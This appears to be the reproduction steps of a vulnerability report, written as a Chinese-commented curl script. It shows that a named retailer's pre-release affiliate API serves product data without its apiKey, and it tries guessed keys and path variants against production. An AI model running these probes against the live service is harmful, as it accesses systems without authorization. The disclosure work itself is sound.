# Fanatical da-pre「Affiliate Products API」缺失 apiKey 鉴权 —— 复现步骤
# 目标: https://da-pre.fanatical.com  (Cloudflare Worker 前置, 响应头 X-Is-Cf-Worker: 1)
# 对照: https://da.fanatical.com     (生产, 同路径强制 apiKey)
# 前置: 公网可达, 无需任何凭据/账号; UA 用浏览器类(裸 curl UA 可能被边缘拦截)
# 判定: da-pre 匿名 200 拿到真实商品 JSON + 生产同路径 401, 两者同时成立才算成立

UA="${ARTEX_UA:-Mozilla/5.0}"
PRE="https://da-pre.fanatical.com"
PROD="https://da.fanatical.com"

# 1) 规格自述: 全局 ApiKeyAuth(query apiKey 必填), server 标注 Prelive
curl -sk -A "$UA" "$PRE/api/v1/swagger.json" -w '\nhttp=%{http_code} bytes=%{size_download}\n'
# 期望: 200, 22719 bytes
#   security=[{"ApiKeyAuth":[]}]
#   securitySchemes={"ApiKeyAuth":{"type":"apiKey","in":"query","name":"apiKey"}}
#   servers=[{"url":"https://da-pre.fanatical.com/api/v1","description":"Prelive"}]
#   paths 仅 4 条 GET: /products, /products/{slug}, /products-steam/{steamId}, /facets

# 2) 主判据: 不带 apiKey 读取商品目录
curl -sk -A "$UA" "$PRE/api/v1/products" -o products.json \
     -w 'http=%{http_code} bytes=%{size_download}\n'
# 期望: http=200 bytes=132066; Content-Type: application/json; X-Is-Cf-Worker: 1
# products.json = JSON 数组(20 条), 每条形如:
#   {"star_deal":false,"id":"...","name":"Football Manager 27","slug":"football-manager-27",
#    "price":55.19,"fullPrice":59.99,"discountPercent":8,
#    "expiryDateString":"2026-12-09T08:00:00.000Z",
#    "href":"https://www.fanatical.com/en/game/football-manager-27?utm_medium=partner&utm_campaign=DynamicAdAPI&daclid=<uuid>"}
# 泄露面: 商品清单 + 实价/原价/折扣 + 促销到期时间 + 联盟追踪链接
# 注: href 中已观察到 utm_medium/utm_campaign/daclid; 摘要提到的 affiliateTags/awinPublisherId
#     归因参数是否透传, 以实际响应为准, 不要预设。

# 3) 反证: apiKey 参数被完全忽略(证明是“校验未实现”, 不是“本就不需要鉴权”)
curl -sk -A "$UA" "$PRE/api/v1/products?apiKey=xxx" -o products2.json \
     -w 'http=%{http_code} bytes=%{size_download}\n'
# 期望: http=200 bytes=132066, 与步骤 2 响应体一致
# 同样 200 且字节一致: ?apiKey=(空) / ?apiKey=REALLOOKINGKEY123456 /
#                      -H 'X-Api-Key: xxx' / -H 'Authorization: Bearer xxx'
md5sum products.json products2.json   # 应完全相同

# 4) 生产对照: 同一路径在 da 上强制鉴权 -> 401(证明缺失只发生在预发布)
curl -sk -A "$UA" "$PROD/api/v1/products" \
     -w '\nhttp=%{http_code} bytes=%{size_download}\n'
# 期望: http=401 bytes=24, body {"error":"Unauthorized"}
# 带弱 key 亦 401: apiKey=xxx|test|prelive|fanatical|dynamicads|da-pre|affiliate
# 路径变体全部 401: /products/、/products%2f、/facets、/facets/all、
#                   /products/football-manager-27、/products-steam/1245620
# 注意: 生产 /api/v1/swagger.json 反而公开 200(只暴露规格, 数据端点仍 401),
#       所以“swagger 可见”不能单独当漏洞判据。

# 5) 其余数据面(同一缺口, 均匿名 200)
curl -sk -A "$UA" "$PRE/api/v1/facets" -o facets.json \
     -w 'http=%{http_code} bytes=%{size_download}\n'
# 期望: 200, 286782 bytes; 统计 categories=388 / franchises=384 / publishers=507 / collections=43
curl -sk -A "$UA" "$PRE/api/v1/products/football-manager-27" \
     -w '\nhttp=%{http_code} bytes=%{size_download}\n'
# 期望: 200, ~7286 bytes(单品详情)
curl -sk -A "$UA" "$PRE/api/v1/products-steam/1245620" \
     -w '\nhttp=%{http_code} bytes=%{size_download}\n'
# 期望: 200, ~7090 bytes(按 Steam appid 查询, 1245620 为示例 appid)

# 6) 附带面: Dynamic Ads Editor 匿名可达
curl -sk -A "$UA" "$PRE/editor" | grep -oE '<title>[^<]*</title>'
# 期望: <title>Dynamic Ads Editor</title>   (meta robots noindex, 但无鉴权)

# 判据汇总:
#  A) swagger 明确声明 ApiKeyAuth(query apiKey) 且 server 描述为 Prelive
#  B) 无凭据 / 任意凭据 / 任意鉴权头均 200 返回真实商品 JSON
#  C) 生产 da 同路径及变体 401 -> 鉴权在生产存在, 缺口只在 da-pre
# 结论: 预发布分支漏配 ApiKeyAuth 中间件, 属配置漂移, 非“接口本就不需要鉴权”。
# 影响边界: 数据为公开商品目录/定价, 无 PII、无写接口、未见密钥泄露 -> medium。
#
# 失败常见原因:
#  1) 本地/平台 HTTP 代理导致 CF 解析异常: 确认 X-Is-Cf-Worker: 1, 必要时 --noproxy '*'
#  2) 裸 curl UA 被边缘拦截: 换浏览器 UA
#  3) 预发布已下线/已补鉴权: 返回 401/403/404, 说明已修复
#  4) 误测生产 da: da 本就要求 apiKey, 只有 da-pre 是缺口